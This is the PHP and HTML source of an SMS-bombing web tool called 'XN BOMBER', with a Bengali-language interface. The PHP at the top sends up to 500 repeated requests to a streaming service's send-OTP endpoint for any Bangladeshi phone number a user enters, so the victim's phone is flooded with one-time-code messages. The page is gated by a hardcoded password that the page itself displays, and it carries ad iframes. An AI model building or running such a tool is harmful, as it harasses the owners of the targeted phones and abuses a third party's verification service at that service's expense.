<?php
session_start();
if(isset($_POST['submit'])){
	$number = $_POST['number'];
	$amount = $_POST['amount'];
	if($amount > 500 or $amount < 0){
		$_SESSION['alert'] = '<div class="alert alert-danger alert-white rounded"><div class="icon"><i class="fa fa-times-circle"></i></div><strong>&#2488;&#2480;&#2509;&#2476;&#2507;&#2458;&#2509;&#2458; &#2474;&#2480;&#2495;&#2478;&#2494;&#2467; &#2539;&#2534;&#2534;!</strong></div><br>';
	}else{
		for($i=0; $i < $amount; $i++){ 
			$url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88".$number."&operator=bd-otp";
			$cSession = curl_init();
			curl_setopt($cSession,CURLOPT_URL,$url);
			curl_setopt($cSession,CURLOPT_RETURNTRANSFER,true);
			curl_setopt($cSession,CURLOPT_HEADER, false);
			$result = curl_exec($cSession);
			$http_code = curl_getinfo($cSession, CURLINFO_HTTP_CODE);
			curl_close($cSession);
		}
	}
	if(empty($http_code)){
		$http_code = "&#2470;&#2479;&#2492;&#2494; &#2453;&#2480;&#2503; &#2438;&#2476;&#2494;&#2480; &#2458;&#2503;&#2487;&#2509;&#2463;&#2494; &#2453;&#2480;&#2497;&#2472; &#2438;&#2474;&#2472;&#2494;&#2480; &#2453;&#2495;&#2459;&#2497; &#2477;&#2497;&#2482; &#2489;&#2479;&#2492;&#2503;&#2459;&#2503;";
	}
	if($http_code == 200){
		$_SESSION['alert'] = '<div class="alert alert-success alert-white rounded"><div class="icon"><i class="fa fa-check"></i></div><strong>&#2438;&#2474;&#2472;&#2495; &#2474;&#2494;&#2464;&#2494;&#2468;&#2503; &#2488;&#2453;&#2509;&#2487;&#2478; &#2489;&#2527;&#2503;&#2459;&#2503;&#2472;!</strong></div><br>';
	}else{
		$_SESSION['alert'] = '<div class="alert alert-danger alert-white rounded"><div class="icon"><i class="fa fa-times-circle"></i></div><strong>&#2476;&#2509;&#2479;&#2480;&#2509;&#2469; &#2489;&#2479;&#2492;&#2503;&#2459;&#2503;&#2472;! '.$http_code.'</strong></div><br>';
	}
}

$password = "XN63CY"; 

if (isset($_POST['login'])){
	if($_POST['password'] == $password){
		setcookie("isLogged", "032a4696d85ef780", time() + 1800, "/");
		header("location: /");
		}else{
			$_SESSION['alert'] = '<div class="alert alert-danger alert-white rounded"><div class="icon"><i class="fa fa-times-circle"></i></div><strong>&#2438;&#2474;&#2472;&#2495; &#2477;&#2497;&#2482; &#2474;&#2494;&#2488;&#2451;&#2527;&#2494;&#2480;&#2509;&#2465; &#2470;&#2495;&#2527;&#2503;&#2459;&#2503;&#2472;!</strong></div><br>';
			}
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>XN BOMBER</title>
	<meta name="viewport" content="width=device-width, user-scalable=no"/>
<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
	<style>
		*{
			padding: 0;
			margin: 0;
		}
		body{
			background: black;
		}
		.container{
			max-width: 290px;
			padding: 50px 30px;
			background: #ffffff;
			margin: 10% auto;
			text-align: center;
			box-shadow: 0 2px 26px 0 red, 0 2px 26px 0 red;
		}
		input{
			width: 90%;
			height: 20px;
			display: inline-block;
			outline: 0;
			border: 0;
			padding: 5px;
			border-bottom: 3px solid royalblue;
		}
		input:focus{
			border-bottom: 3px solid dodgerblue;
			transition: .5s;
		}
		.button{
			height: 35px;
			width: 95%;
			background: #800000;
			border: 0;
			color: #FFFFFF;
			font-weight: bold;
			padding: 7px 13px;
			outline: 0;
			text-decoration: none;
		}
		.button:hover{
			background: #d9534f;		
			outline: 0;
		}
		.bless{
			font-size: 13px;
			color: #FF0081;
			font-family: "Reggae One";
		}
		h2{
			color: royalblue;
			font-family: "Reggae One";
		}
		h3{
			color: red;
			font-family: "Reggae One";
		}
		.close {
		    float: right;
		    font-size: 21px;
		    font-weight: bold;
		    line-height: 1;
		    color: #000;
		    text-shadow: 0 1px 0 #fff;
		    opacity: .2;
		}

		.close:hover,.close:focus {
		    color: #000;
		    text-decoration: none;
		    cursor: pointer;
		    opacity: .5;
		}

		button.close {
		    padding: 0;
		    cursor: pointer;
		    background: transparent;
		    border: 0;
		    -webkit-appearance: none;
		}

		.alert {
		    padding: 15px;
		    width: 67%;
		    margin: auto;
		    border: 1px solid transparent;
		    border-radius: 4px;
		}

		.alert h4 {
		    margin-top: 0;
		    color: inherit;
		}

		.alert .alert-link {
		    font-weight: bold;
		}

		.alert>p,.alert>ul {
		    margin-bottom: 0;
		}

		.alert>p+p {
		    margin-top: 5px;
		}

		.alert-dismissable {
		    padding-right: 35px;
		}

		.alert-dismissable .close {
		    position: relative;
		    top: -2px;
		    right: -21px;
		    color: inherit;
		}

		.alert-success {
		    background-color: #dff0d8;
		    border-color: #d6e9c6;
		    color: #3c763d;
		}

		.alert-success hr {
		    border-top-color: #c9e2b3;
		}

		.alert-success .alert-link {
		    color: #2b542c;
		}

		.alert-info {
		    background-color: #d9edf7;
		    border-color: #bce8f1;
		    color: #31708f;
		}

		.alert-info hr {
		    border-top-color: #a6e1ec;
		}

		.alert-info .alert-link {
		    color: #245269;
		}

		.alert-warning {
		    background-color: #fcf8e3;
		    border-color: #faebcc;
		    color: #8a6d3b;
		}

		.alert-warning hr {
		    border-top-color: #f7e1b5;
		}

		.alert-warning .alert-link {
		    color: #66512c;
		}

		.alert-danger {
		    background-color: #f2dede;
		    border-color: #ebccd1;
		    color: #a94442;
		}

		.alert-danger hr {
		    border-top-color: #e4b9c0;
		}

		.alert-danger .alert-link {
		    color: #843534;
		}

		.alert {
		    border-radius: 0;
		    -webkit-border-radius: 0;
		    box-shadow: 0 1px 2px rgba(0,0,0,0.11);
		}

		.alert .sign {
		    font-size: 20px;
		    vertical-align: middle;
		    margin-right: 5px;
		    text-align: center;
		    width: 25px;
		    display: inline-block;
		}

		.alert-success {
		    background-color: #dbf6d3;
		    border-color: #aed4a5;
		    color: #569745;
		}

		.alert-info {
		    background-color: #d9edf7;
		    border-color: #98cce6;
		    color: #3a87ad;
		}

		.alert-warning {
		    background-color: #fcf8e3;
		    border-color: #f1daab;
		    color: #c09853;
		}

		.alert-danger {
		    background-color: #f2dede;
		    border-color: #e0b1b8;
		    color: #b94a48;
		}

		.alert-white {
		    background-image: linear-gradient(to bottom,#FFFFFF,#F9F9F9);
		    border-top-color: #d8d8d8;
		    border-bottom-color: #bdbdbd;
		    border-left-color: #cacaca;
		    border-right-color: #cacaca;
		    color: #404040;
		    padding-left: 61px;
		    position: relative;
		}

		.alert-white .icon {
		    text-align: center;
		    width: 45px;
		    height: 100%;
		    position: absolute;
		    top: -1px;
		    left: -1px;
		    border: 1px solid #bdbdbd;
		}

		.alert-white .icon:after {
		    -webkit-transform: rotate(45deg);
		    -moz-transform: rotate(45deg);
		    -ms-transform: rotate(45deg);
		    -o-transform: rotate(45deg);
		    -webkit-transform: rotate(45deg);
		    display: block;
		    content: '';
		    width: 10px;
		    height: 10px;
		    border: 1px solid #bdbdbd;
		    position: absolute;
		    border-left: 0;
		    border-bottom: 0;
		    top: 50%;
		    right: -6px;
		    margin-top: -5px;
		    background: #fff;
		}

		.alert-white.rounded {
		    border-radius: 3px;
		    -webkit-border-radius: 3px;
		}

		.alert-white.rounded .icon {
		    border-radius: 3px 0 0 3px;
		    -webkit-border-radius: 3px 0 0 3px;
		}

		.alert-white .icon i {
		    font-size: 20px;
		    color: #FFF;
		    left: 12px;
		    margin-top: -10px;
		    position: absolute;
		    top: 50%;
		}

		.alert-white.alert-danger .icon,.alert-white.alert-danger .icon:after {
		    border-color: #ca452e;
		    background: #da4932;
		}

		.alert-white.alert-info .icon,.alert-white.alert-info .icon:after {
		    border-color: #3a8ace;
		    background: #4d90fd;
		}

		.alert-white.alert-warning .icon,.alert-white.alert-warning .icon:after {
		    border-color: #d68000;
		    background: #fc9700;
		}

		.alert-white.alert-success .icon,.alert-white.alert-success .icon:after {
		    border-color: #54a754;
		    background: #60c060;
		}
		-webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; -o-user-select: none; user-select: none;
	.seo{background:#ccf1ff; padding:6px; font-weight:bold;}
</style>
</head>
<body>
<div align="center"><a href="/"><img src="https://i.ibb.co/nRt9jXQ/20210220-075128.png" alt="XN" width="290" height="90"></a></div>

<div class='header__live'>  <span class="header__live-title"> <i class="fa fa-circle-o animate" aria-hidden="true" style="margin-right: 5px; color: white;font-size:16px;"></i> </span> <span> <marquee behavior="scroll" direction="left" onmouseover="this.stop();" onmouseout="this.start();" style='font-family:Lato;letter-spacing:2px;margin-bottom: -9px;'><b>&#2438;&#2460; <span id="date-today"></span>&#2404;  &#2447;&#2453;&#2509;&#2488; &#2447;&#2472;-&#2447; &#2438;&#2474;&#2472;&#2494;&#2453;&#2503; &#2488;&#2509;&#2476;&#2494;&#2455;&#2468;&#2478;, <font style="font-size:15px;font-weight:bold;color:red;>">
&#2438;&#2478;&#2494;&#2470;&#2503;&#2480; &#2488;&#2494;&#2439;&#2463;&#2503;&#2480; &#2476;&#2480;&#2509;&#2468;&#2478;&#2494;&#2472;  &#2474;&#2494;&#2488;&#2451;&#2527;&#2494;&#2480;&#2509;&#2465; &#2489;&#2482;&#2507;&#2435; <font color="black"><i>XN63CY</i></font> &#2404; &#2453;&#2503;&#2441; &#2479;&#2470;&#2495; &#2447;&#2439; &#2488;&#2494;&#2439;&#2463; &#2470;&#2495;&#2527;&#2503; &#2454;&#2494;&#2480;&#2494;&#2474; &#2453;&#2494;&#2460; &#2453;&#2480;&#2503;&#2472; &#2468;&#2494;&#2489;&#2482;&#2503; &#2447;&#2480; &#2470;&#2494;&#2527;&#2477;&#2494;&#2524; &#2438;&#2474;&#2472;&#2494;&#2480; &#2472;&#2495;&#2468;&#2503; &#2489;&#2476;&#2503;, &#2447;&#2463;&#2495; &#2478;&#2460;&#2494; &#2453;&#2480;&#2494;&#2480; &#2460;&#2472;&#2509;&#2479; &#2476;&#2494;&#2472;&#2494;&#2472;&#2507; &#2489;&#2527;&#2503;&#2459;&#2503;&#2404;</font></marquee></span> </div> <!---marque---> </div><div><br/><script src="//shakibwap.github.io/bn.js"></script><script>dateToday('date-today', 'bangla');</script><br><br>
	<div class="container">
		<form method="POST">
			<h2>XN</h2><br><br>
			
 <div align="center"><div class="search"><iframe data-aa="1575777" src="//ad.a-ads.com/1575777?size=320x100" scrolling="no" style="width:320px; height:100px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe><br><br><iframe src="http://web.facebook.com/plugins/like.php?href=http://facebook.com/xn.zx.cc.page/&send=false&layout=standard&width=160&show_faces=false&action=like&colorscheme=light&font=arial&height=21"scrolling="no"frameborder="0"style="border:none;overflow:hidden;width:200px;height:25px;"allowTransparency="false"></iframe></div></div>
<br><br>
			<?php
			if(isset($_SESSION['alert'])){
				echo $_SESSION['alert'];
			}
			if(!isset($_SESSION['alert'])){
				if(isset($_COOKIE["isLogged"])){
			?>
			<input type="number" name="number" placeholder="&#2488;&#2434;&#2454;&#2509;&#2479;&#2494; (&#2474;&#2509;&#2480;&#2494;&#2453;&#2509;&#2468;&#2472; 01XXXXXXXXX)" autocomplete="off">
			<br><br>
			<input type="number" name="amount" placeholder="&#2474;&#2480;&#2495;&#2478;&#2494;&#2467; (&#2488;&#2480;&#2509;&#2476;&#2507;&#2458;&#2509;&#2458; &#2539;&#2534;&#2534;)" autocomplete="off">
			<br><br>
			<input type="submit" name="submit" value="&#2460;&#2478;&#2494; &#2470;&#2495;&#2472;!" class="button">
		<?php
			}else{
		?>
			<form method="POST">
			<input type="password" name="password" placeholder="&#2474;&#2494;&#2488;&#2451;&#2527;&#2494;&#2480;&#2509;&#2465;" autocomplete="off">
			<br><br>
			<input type="submit" name="login" value="&#2474;&#2509;&#2480;&#2476;&#2503;&#2486; &#2453;&#2480;&#2497;&#2472;" class="button">
				</form>
			<?php
				}
		 }else{
			?>
			<a href="/" class="button">&#2438;&#2476;&#2494;&#2480; &#2458;&#2503;&#2487;&#2509;&#2463;&#2494; &#2453;&#2480;&#2497;&#2472;!</a>
			<?php
		}
			$_SESSION['alert'] = null;
		?><br><br />
		<center><div align="center"><div class="search"><iframe data-aa="1575777" src="//ad.a-ads.com/1575777?size=320x100" scrolling="no" style="width:320px; height:100px; border:0px; padding:0; overflow:hidden" allowtransparency="true"></iframe></div></div>
		</center><br><br></form>
	</div>
	<div>  <style>.header__live a:hover {text-decoration:none;color:#000;background:none;} .header__live {padding:0px 10px 0px 0px; background: #fff; -webkit-box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 2px 0 -2px rgba(0,0,0,0.2), 0 0 2px 0 rgba(0,0,0,0.12); -moz-box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14),0 2px 0 -2px rgba(0,0,0,0.2),0 0 2px 0 rgba(0,0,0,0.12); box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 2px 0 -2px rgba(0,0,0,0.2), 0 0 2px 0 rgba(0,0,0,0.12); -webkit-transition: box-shadow 0.25s; -moz-transition: box-shadow 0.25s; -ms-transition: box-shadow 0.25s; -o-transition: box-shadow 0.25s; transition: box-shadow 0.25s;} .header__live-title { background:#306EFF; height: 30px; padding: 0 20px; color: #009973; line-height: 35px; font-family: 'Lato', cursive !important; font-size: 10pt; font-weight: bold;} .header__live {display: flex;align-items: center;}</style>
<center><h3><b>Total: <img src="https://www.webfreecounter.com/hit.php?id=genpxnp&nd=6&style=2" border="0" alt="web counter"/>
</h3></b></center>
</body>
</html></h3></b></center>
<shakibahmed style="display:none">
</body>
</html>
